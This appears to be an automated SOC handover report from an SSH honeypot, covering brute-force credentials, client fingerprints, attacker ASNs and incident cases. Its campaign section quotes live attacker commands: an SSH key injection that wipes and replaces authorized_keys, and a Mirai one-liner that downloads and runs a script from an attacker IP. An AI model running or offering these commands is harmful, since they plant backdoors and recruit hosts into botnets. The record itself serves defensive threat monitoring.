# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-14 |
| **Generated At** | 2026-11-14T03:57:48Z |
| **Shift Time** | 03:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **172** |
| Confirmed Threats | **158** |
| False Positives Filtered | **14** (8.1%) |
| Unique Attacker IPs | **80** |
| Countries of Origin | **26** |
| High Severity Cases | **127** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **45** |
| Malware Samples Analyzed | **9** HIGH · **26** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **343** |
| Unique Credential Pairs | **277** |
| Unique Usernames | **96** |
| Unique Passwords | **220** |
| Successful Auth Pairs | **312** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 125 |
| `admin` | 47 |
| `support` | 12 |
| `guest` | 8 |
| `administrator` | 7 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `1234` | 11 |
| `123456` | 9 |
| `admin` | 9 |
| `password` | 7 |
| `123` | 7 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `support` | `support` | 7 |
| `admin` | `BrAhMoS@15` | 7 |
| `admin` | `default` | 6 |
| `guest` | `guest4` | 5 |
| `root` | `` | 4 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `admin3` | `A1234567890` | `109.160.32.144` | 2026-11-14T00:00:04 |
| `kingbase` | `kingbase@2022` | `109.160.32.144` | 2026-11-14T00:00:13 |
| `gitlab-runner` | `test` | `109.160.32.144` | 2026-11-14T00:00:23 |
| `root` | `password` | `109.160.32.144` | 2026-11-14T00:00:31 |
| `root` | `rootme` | `195.178.110.228` | 2026-11-14T00:00:37 |
| `root` | `vpn123` | `109.160.32.144` | 2026-11-14T00:00:41 |
| `root` | `123abc456` | `109.160.32.144` | 2026-11-14T00:00:48 |
| `ranga` | `ranga` | `109.160.32.144` | 2026-11-14T00:00:56 |
| `ubuntu` | `Aa123456` | `109.160.32.144` | 2026-11-14T00:01:05 |
| `administrator` | `administrator` | `109.160.32.144` | 2026-11-14T00:01:13 |
| `aiuser` | `aiuser` | `109.160.32.144` | 2026-11-14T00:01:22 |
| `a` | `abc` | `109.160.32.144` | 2026-11-14T00:01:30 |
| `bob` | `bob` | `109.160.32.144` | 2026-11-14T00:01:38 |
| `ubuntu` | `root123` | `109.160.32.144` | 2026-11-14T00:01:47 |
| `web` | `1` | `109.160.32.144` | 2026-11-14T00:01:56 |
| `git` | `git123` | `109.160.32.144` | 2026-11-14T00:02:05 |
| `aiuser` | `qwerty` | `109.160.32.144` | 2026-11-14T00:02:11 |
| `root` | `system` | `195.178.110.228` | 2026-11-14T00:02:14 |
| `root` | `qwe123456` | `109.160.32.144` | 2026-11-14T00:02:19 |
| `teamspeak` | `teamspeak` | `109.160.32.144` | 2026-11-14T00:02:26 |
_… 292 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **172** |
| Sessions with Fingerprint | **16** |
| Unique HASSH Fingerprints | **16** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 88 |
| OpenSSH | 33 |
| libssh | 6 |
| Unknown | 3 |
| PuTTY | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `2ec37a7cc8da...` | Mirai/variant | 77 | 2 |
| `acaa53e0a7d7...` | Mirai/variant | 30 | 30 |
| `03a80b21afa8...` | Modern SSH client | 4 | 2 |
| `0a07365cc01f...` | Generic scanner | 2 | 1 |
| `dd9bcf093c35...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `2ec37a7cc8da...` | Go SSH scanner | 77 | 2 | Mirai/variant |
| `acaa53e0a7d7...` | OpenSSH | 30 | 30 | Mirai/variant |
| `03a80b21afa8...` | libssh | 4 | 2 | Modern SSH client |
| `95420f9d932d...` | OpenSSH | 3 | 3 | — |
| `0a07365cc01f...` | Go SSH scanner | 2 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 2 | 2 | Mirai/variant |
| `a289c065bf37...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `f555226df196...` | libssh | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **83** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1083, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 2 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `186.96.158.180`, `114.220.176.69`, `183.82.111.224`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
cd /tmp 2>/dev/null || cd /var 2>/dev/null || cd /dev/shm 2>/dev/null || cd /run 2>/dev/null || cd /root 2>/dev/null || cd /;rm -f kla.sh;wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||busybox wget -O kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null||curl -sLo kla.sh http://160.119.66.206/bins/kla.sh 2>/dev/null;chmod 777 kla.sh;sh kla.sh telnet&
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **80** |
| Unique ASNs | **50** |
| High-Risk ASNs | **42** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 19 | HIGH |
| `AS4766` | Korea Telecom | 4 | HIGH |
| `AS22773` | Cox Communications Inc. | 3 | HIGH |
| `AS25159` | PJSC MegaFon | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS6939` | Hurricane Electric LLC | 2 | HIGH |
| `AS198364` | BANATSYNC SRL | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (126)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-8fd759ec580c

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]144` |
| **First Seen** | 2026-11-14 00:00 |
| **Last Seen** | 2026-11-14 00:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:00:02` | `cowrie.session.connect` |
| `2026-11-14 00:00:02` | `cowrie.client.version` |
| `2026-11-14 00:00:02` | `cowrie.client.kex` |
| `2026-11-14 00:00:04` | `cowrie.login.success` |
| `2026-11-14 00:00:06` | `cowrie.session.params` |
| `2026-11-14 00:00:06` | `cowrie.command.input` |
| `2026-11-14 00:00:06` | `cowrie.log.closed` |
| `2026-11-14 00:00:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]144` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8bbcd6d9034

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:00 |
| **Last Seen** | 2026-11-14 00:00 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8122399620d7250378b8c47d7e46216f_small_control'"'"' '"'"'check_8122399620d7250378b8c47d7e46216f'"'"'', printf '\n%s|%s\n' 'check_8122399620d7250378b8c47d7e46216f_small_control' 'check_8122399620d7250378b8c47d7e46216f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_8122399620d7250378b8c47d7e46216f_small_math'"'"' "$((158*869+79))"', (158*869+79, printf '\n%s|%s\n' 'check_8122399620d7250378b8c47d7e46216f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:00:35` | `cowrie.session.connect` |
| `2026-11-14 00:00:35` | `cowrie.client.version` |
| `2026-11-14 00:00:35` | `cowrie.client.kex` |
| `2026-11-14 00:00:37` | `cowrie.login.success` |
| `2026-11-14 00:00:38` | `cowrie.client.size` |
| `2026-11-14 00:00:39` | `cowrie.session.params` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| `2026-11-14 00:00:39` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ed610f6ceba

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:02 |
| **Last Seen** | 2026-11-14 00:02 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bdbd23a092811323b491eb9475b13569_small_control'"'"' '"'"'check_bdbd23a092811323b491eb9475b13569'"'"'', printf '\n%s|%s\n' 'check_bdbd23a092811323b491eb9475b13569_small_control' 'check_bdbd23a092811323b491eb9475b13569', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_bdbd23a092811323b491eb9475b13569_small_math'"'"' "$((718*202+74))"', (718*202+74, printf '\n%s|%s\n' 'check_bdbd23a092811323b491eb9475b13569_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:02:12` | `cowrie.session.connect` |
| `2026-11-14 00:02:12` | `cowrie.client.version` |
| `2026-11-14 00:02:12` | `cowrie.client.kex` |
| `2026-11-14 00:02:14` | `cowrie.login.success` |
| `2026-11-14 00:02:16` | `cowrie.client.size` |
| `2026-11-14 00:02:16` | `cowrie.session.params` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| `2026-11-14 00:02:17` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb3bc9e21ae3

| Field | Detail |
|---|---|
| **Source IP** | `119.194.33[.]34` |
| **First Seen** | 2026-11-14 00:03 |
| **Last Seen** | 2026-11-14 00:03 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:03:46` | `cowrie.session.connect` |
| `2026-11-14 00:03:47` | `cowrie.client.version` |
| `2026-11-14 00:03:47` | `cowrie.client.kex` |
| `2026-11-14 00:03:50` | `cowrie.login.success` |
| `2026-11-14 00:03:51` | `cowrie.direct-tcpip.request` |
| `2026-11-14 00:03:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.194.33[.]34` to AbuseIPDB if not already reported
- [ ] Block `119.194.33[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-266de64b5e75

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:03 |
| **Last Seen** | 2026-11-14 00:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d06daadb636df46165c547e90da0fd67_small_control'"'"' '"'"'check_d06daadb636df46165c547e90da0fd67'"'"'', printf '\n%s|%s\n' 'check_d06daadb636df46165c547e90da0fd67_small_control' 'check_d06daadb636df46165c547e90da0fd67', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_d06daadb636df46165c547e90da0fd67_small_math'"'"' "$((517*136+8))"', (517*136+8, printf '\n%s|%s\n' 'check_d06daadb636df46165c547e90da0fd67_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:03:48` | `cowrie.session.connect` |
| `2026-11-14 00:03:48` | `cowrie.client.version` |
| `2026-11-14 00:03:48` | `cowrie.client.kex` |
| `2026-11-14 00:03:50` | `cowrie.login.success` |
| `2026-11-14 00:03:52` | `cowrie.client.size` |
| `2026-11-14 00:03:53` | `cowrie.session.params` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| `2026-11-14 00:03:53` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-395a27a9d66a

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:05 |
| **Last Seen** | 2026-11-14 00:05 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e5a00432dec3a6d1bdfe6cf72c2bf583_small_control'"'"' '"'"'check_e5a00432dec3a6d1bdfe6cf72c2bf583'"'"'', printf '\n%s|%s\n' 'check_e5a00432dec3a6d1bdfe6cf72c2bf583_small_control' 'check_e5a00432dec3a6d1bdfe6cf72c2bf583', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_e5a00432dec3a6d1bdfe6cf72c2bf583_small_math'"'"' "$((959*84+3))"', (959*84+3, printf '\n%s|%s\n' 'check_e5a00432dec3a6d1bdfe6cf72c2bf583_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:05:33` | `cowrie.session.connect` |
| `2026-11-14 00:05:33` | `cowrie.client.version` |
| `2026-11-14 00:05:33` | `cowrie.client.kex` |
| `2026-11-14 00:05:36` | `cowrie.login.success` |
| `2026-11-14 00:05:38` | `cowrie.client.size` |
| `2026-11-14 00:05:39` | `cowrie.session.params` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| `2026-11-14 00:05:39` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24fc2b9eb5fa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:07 |
| **Last Seen** | 2026-11-14 00:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_79623fffe89e8845bcee8a0d58c4d4f5_small_control'"'"' '"'"'check_79623fffe89e8845bcee8a0d58c4d4f5'"'"'', printf '\n%s|%s\n' 'check_79623fffe89e8845bcee8a0d58c4d4f5_small_control' 'check_79623fffe89e8845bcee8a0d58c4d4f5', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_79623fffe89e8845bcee8a0d58c4d4f5_small_math'"'"' "$((168*528+35))"', (168*528+35, printf '\n%s|%s\n' 'check_79623fffe89e8845bcee8a0d58c4d4f5_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:07:19` | `cowrie.session.connect` |
| `2026-11-14 00:07:19` | `cowrie.client.version` |
| `2026-11-14 00:07:19` | `cowrie.client.kex` |
| `2026-11-14 00:07:21` | `cowrie.login.success` |
| `2026-11-14 00:07:23` | `cowrie.client.size` |
| `2026-11-14 00:07:23` | `cowrie.session.params` |
| `2026-11-14 00:07:23` | `cowrie.command.input` |
| `2026-11-14 00:07:23` | `cowrie.command.input` |
| `2026-11-14 00:07:23` | `cowrie.command.input` |
| `2026-11-14 00:07:23` | `cowrie.command.input` |
| `2026-11-14 00:07:23` | `cowrie.command.input` |
| `2026-11-14 00:07:24` | `cowrie.command.input` |
| `2026-11-14 00:07:24` | `cowrie.command.input` |
| `2026-11-14 00:07:24` | `cowrie.command.input` |
| `2026-11-14 00:07:24` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-017174d4e3d5

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:09 |
| **Last Seen** | 2026-11-14 00:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_aea0e43278b934915b8d23d9ce2f123a_small_control'"'"' '"'"'check_aea0e43278b934915b8d23d9ce2f123a'"'"'', printf '\n%s|%s\n' 'check_aea0e43278b934915b8d23d9ce2f123a_small_control' 'check_aea0e43278b934915b8d23d9ce2f123a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_aea0e43278b934915b8d23d9ce2f123a_small_math'"'"' "$((837*941+85))"', (837*941+85, printf '\n%s|%s\n' 'check_aea0e43278b934915b8d23d9ce2f123a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:09:00` | `cowrie.session.connect` |
| `2026-11-14 00:09:00` | `cowrie.client.version` |
| `2026-11-14 00:09:00` | `cowrie.client.kex` |
| `2026-11-14 00:09:03` | `cowrie.login.success` |
| `2026-11-14 00:09:04` | `cowrie.client.size` |
| `2026-11-14 00:09:04` | `cowrie.session.params` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| `2026-11-14 00:09:05` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fce48ffbbc35

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:10 |
| **Last Seen** | 2026-11-14 00:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_643baaf9c089c4cfad5d59331b54570a_small_control'"'"' '"'"'check_643baaf9c089c4cfad5d59331b54570a'"'"'', printf '\n%s|%s\n' 'check_643baaf9c089c4cfad5d59331b54570a_small_control' 'check_643baaf9c089c4cfad5d59331b54570a', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_643baaf9c089c4cfad5d59331b54570a_small_math'"'"' "$((735*166+52))"', (735*166+52, printf '\n%s|%s\n' 'check_643baaf9c089c4cfad5d59331b54570a_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:10:42` | `cowrie.session.connect` |
| `2026-11-14 00:10:42` | `cowrie.client.version` |
| `2026-11-14 00:10:42` | `cowrie.client.kex` |
| `2026-11-14 00:10:45` | `cowrie.login.success` |
| `2026-11-14 00:10:46` | `cowrie.client.size` |
| `2026-11-14 00:10:46` | `cowrie.session.params` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| `2026-11-14 00:10:47` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b77f9af66fa

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:12 |
| **Last Seen** | 2026-11-14 00:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dac7f1c38c158e18ce5f495f8ea96c7f_small_control'"'"' '"'"'check_dac7f1c38c158e18ce5f495f8ea96c7f'"'"'', printf '\n%s|%s\n' 'check_dac7f1c38c158e18ce5f495f8ea96c7f_small_control' 'check_dac7f1c38c158e18ce5f495f8ea96c7f', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_dac7f1c38c158e18ce5f495f8ea96c7f_small_math'"'"' "$((176*450+39))"', (176*450+39, printf '\n%s|%s\n' 'check_dac7f1c38c158e18ce5f495f8ea96c7f_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:12:19` | `cowrie.session.connect` |
| `2026-11-14 00:12:19` | `cowrie.client.version` |
| `2026-11-14 00:12:19` | `cowrie.client.kex` |
| `2026-11-14 00:12:21` | `cowrie.login.success` |
| `2026-11-14 00:12:22` | `cowrie.client.size` |
| `2026-11-14 00:12:23` | `cowrie.session.params` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| `2026-11-14 00:12:23` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc2205a739ec

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-11-14 00:13 |
| **Last Seen** | 2026-11-14 00:14 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_38bfe7a3dd8c6256f23824a05713fae1_small_control'"'"' '"'"'check_38bfe7a3dd8c6256f23824a05713fae1'"'"'', printf '\n%s|%s\n' 'check_38bfe7a3dd8c6256f23824a05713fae1_small_control' 'check_38bfe7a3dd8c6256f23824a05713fae1', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_38bfe7a3dd8c6256f23824a05713fae1_small_math'"'"' "$((570*831+75))"', (570*831+75, printf '\n%s|%s\n' 'check_38bfe7a3dd8c6256f23824a05713fae1_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-14 00:13:55` | `cowrie.session.connect` |
| `2026-11-14 00:13:55` | `cowrie.client.version` |
| `2026-11-14 00:14:01` | `cowrie.client.kex` |
| `2026-11-14 00:14:02` | `cowrie.login.success` |
| `2026-11-14 00:14:04` | `cowrie.client.size` |
| `2026-11-14 00:14:04` | `cowrie.session.params` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| `2026-11-14 00:14:05` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
